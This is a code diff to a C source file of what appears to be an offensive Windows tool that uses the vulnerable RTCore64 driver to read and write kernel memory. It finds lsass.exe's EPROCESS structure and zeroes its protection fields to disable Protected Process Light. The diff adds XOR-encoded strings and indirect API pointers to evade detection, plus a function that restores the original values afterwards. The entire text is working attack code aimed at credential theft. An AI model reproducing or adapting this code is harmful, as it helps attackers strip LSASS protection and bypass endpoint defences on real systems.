@@ -4,6 +4,8 @@
 #include "offsets.h"
 #include "osinfo.h"
 #include "utils.h"
+#include "defs.h"
+#include "api.h"
 #include <string.h>
 
 // =====================================================
@@ -21,7 +23,7 @@ DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
     memRead.Address = Address;
     memRead.ReadSize = Size;
     DWORD BytesReturned;
-    DeviceIoControl(Device,
+    pDIOC(Device,
         RTC64_MEMORY_READ_CODE,
         &memRead,
         sizeof(memRead),
@@ -38,7 +40,7 @@ void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Valu
     memWrite.ReadSize = Size;
     memWrite.Value = Value;
     DWORD BytesReturned;
-    DeviceIoControl(Device,
+    pDIOC(Device,
         RTC64_MEMORY_WRITE_CODE,
         &memWrite,
         sizeof(memWrite),
@@ -80,8 +82,13 @@ BOOL ReadMemoryBuffer(HANDLE Device, DWORD64 Address, void* Buffer, DWORD Buffer
 }
 
 // =====================================================
-// Function to Read the EPROCESS Structure of lsass.exe
+// Functions to disable PPL on lsass.exe 
 // =====================================================
+
+BYTE OriginalSigLv = 0x00;
+BYTE OriginalSecSigLv = 0x00;
+BYTE OriginalProt = 0x00;
+DWORD64 SavedEproc = 0;
 
 void disablePPL() {
     Offsets offs = getOffsets();
@@ -91,34 +98,35 @@ void disablePPL() {
     }
 
     // \\.\RTCore64
-    const unsigned char dev_enc[] = { 0x6C, 0x6D, 0x1C, 0x6F, 0x66, 0x61, 0x75, 0x58, 0x4A, 0x5C, 0x57, 0x56 };
+    const unsigned char dev_enc[] = { 0x6C, 0x6D, 0x1C, 0x6F, 0x66, 0x61, 0x75, 0x58, 0x4A, 0x5C, 0x57, 0x56 }; 
     char* dev_path = xor_decrypt_string(dev_enc, sizeof(dev_enc), XOR_KEY, key_len);
 
-    HANDLE Device = CreateFileA(dev_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+    
+    HANDLE Device = pCFA(dev_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
     free(dev_path);
-
+    
     if (Device == INVALID_HANDLE_VALUE) {
         log_error("Unable to obtain a handle to the device object");
         return;
     }
     log_info("Device handle obtained");
-
+    
     DWORD64 ntBase = getKBAddr();
     log_info("Ker base address: 0x%llx", ntBase);
-
+    
     // LoadLibraryW("ntoskrnl.exe")
     const unsigned char nt_enc[] = { 0x5E, 0x45, 0x5D, 0x40, 0x5F, 0x47, 0x58, 0x5B, 0x16, 0x5C, 0x19, 0x07 };
     char* nt_path = xor_decrypt_string(nt_enc, sizeof(nt_enc), XOR_KEY, key_len);
     wchar_t* nt_pathW = to_wide(nt_path);
-    HMODULE hNtoskrnl = LoadLibraryW(nt_pathW);
+    HMODULE hNtoskrnl = pLLW(nt_pathW);
     free(nt_path); free(nt_pathW);
-
+    
     if (!hNtoskrnl) {
         log_error("Failed to load Ker");
         CloseHandle(Device);
         return;
     }
-
+    
     // GetProcAddress("PsInitialSystemProcess")
     const unsigned char ps_enc[] = { 0x60, 0x42, 0x7B, 0x5D, 0x5D, 0x41, 0x5F, 0x56, 0x54, 0x6A, 0x18, 0x11, 0x17, 0x01, 0x08, 0x36, 0x15, 0x07, 0x0A, 0x0F, 0x43, 0x42 };
     char* ps_str = xor_decrypt_string(ps_enc, sizeof(ps_enc), XOR_KEY, key_len);
@@ -134,7 +142,7 @@ void disablePPL() {
 
     DWORD64 list_head = sys_eproc + offs.ActiveProcessLinks;
     DWORD64 curr_entry = ReadMemoryDWORD64(Device, list_head);
-
+    
     while (curr_entry != list_head) {
         DWORD64 eproc = curr_entry - offs.ActiveProcessLinks;
         char name[16] = { 0 };
@@ -147,22 +155,83 @@ void disablePPL() {
 
         if (_stricmp(name, target) == 0) {
             free(target);
-            log_info("Found EPRO at 0x%llx", eproc);
+            log_info("Found EPROC at 0x%llx", eproc);
 
-            BYTE prot = (BYTE)ReadMemoryPrimitive(Device, 1, eproc + offs.Protection);
-            log_info("Protection value: 0x%02X", prot);
+            // Save EPROCESS address
+            SavedEproc = eproc;
+            
+            log_info("Original protection values:");
+            OriginalSigLv = (BYTE)ReadMemoryPrimitive(Device, 1, eproc + offs.Protection - 2);
+            log_info("\tProtection value: 0x%02X", OriginalSigLv);
+            OriginalSecSigLv = (BYTE)ReadMemoryPrimitive(Device, 1, eproc + offs.Protection - 1);
+            log_info("\tProtection value: 0x%02X", OriginalSecSigLv);
+            OriginalProt = (BYTE)ReadMemoryPrimitive(Device, 1, eproc + offs.Protection);
+            log_info("\tProtection value: 0x%02X", OriginalProt);
 
             // Disable
-            WriteMemoryPrimitive(Device, 1, eproc + offs.Protection, 0x00);
+            WriteMemoryPrimitive(Device, 1, eproc + offs.Protection - 2, 0x00); // SignatureLevel
+            WriteMemoryPrimitive(Device, 1, eproc + offs.Protection - 1, 0x00); // SectionSignatureLevel
+            WriteMemoryPrimitive(Device, 1, eproc + offs.Protection, 0x00); // Protection
             log_success("PPL disabled (0x00 written)");
 
-            BYTE post = (BYTE)ReadMemoryPrimitive(Device, 1, eproc + offs.Protection);
-            log_info("Protection value after write: 0x%02X", post);
+            BYTE post = (BYTE)ReadMemoryPrimitive(Device, 1, eproc + offs.Protection - 2);
+            log_info("\tSigLv value after write: 0x%02X", post);
+
+            post = (BYTE)ReadMemoryPrimitive(Device, 1, eproc + offs.Protection - 1);
+            log_info("\tSecSigLv value after write: 0x%02X", post);
+
+            post = (BYTE)ReadMemoryPrimitive(Device, 1, eproc + offs.Protection);
+            log_info("\tProt value after write: 0x%02X", post);
+            
+
             break;
         }
         free(target);
         curr_entry = ReadMemoryDWORD64(Device, curr_entry);
     }
+    
+
+    CloseHandle(Device);
+}
+
+void restorePPL() {
+    if (SavedEproc == 0) {
+        log_error("No saved EPRO found. Run disablePPL() first.");
+        return;
+    }
+
+    Offsets offs = getOffsets();
+    if (offs.Protection == 0) {
+        log_error("Offset 'Prot' not mapped... exiting!");
+        exit(1);
+    }
+
+    // \\.\RTCore64
+    const unsigned char dev_enc[] = { 0x6C, 0x6D, 0x1C, 0x6F, 0x66, 0x61, 0x75, 0x58, 0x4A, 0x5C, 0x57, 0x56 };
+    char* dev_path = xor_decrypt_string(dev_enc, sizeof(dev_enc), XOR_KEY, key_len);
+
+    HANDLE Device = pCFA(dev_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+    free(dev_path);
+
+    if (Device == INVALID_HANDLE_VALUE) {
+        log_error("Unable to obtain a handle to the device object");
+        return;
+    }
+    log_info("Device handle obtained for restoration");
+
+    // Restore protections
+    WriteMemoryPrimitive(Device, 1, SavedEproc + offs.Protection - 2, OriginalSigLv);
+    WriteMemoryPrimitive(Device, 1, SavedEproc + offs.Protection - 1, OriginalSecSigLv);
+    WriteMemoryPrimitive(Device, 1, SavedEproc + offs.Protection, OriginalProt);
+
+    log_success("PPL restored to original value:");
+    
+    BYTE post = (BYTE)ReadMemoryPrimitive(Device, 1, SavedEproc + offs.Protection - 2);
+    log_info("\tSigLv value after write: 0x%02X", post);
+    post = (BYTE)ReadMemoryPrimitive(Device, 1, SavedEproc + offs.Protection - 1);
+    log_info("\tSecSigLv value after write: 0x%02X", post);
+    post = (BYTE)ReadMemoryPrimitive(Device, 1, SavedEproc + offs.Protection);
+    log_info("\tProt value after write: 0x%02X", post);
 
     CloseHandle(Device);
 }
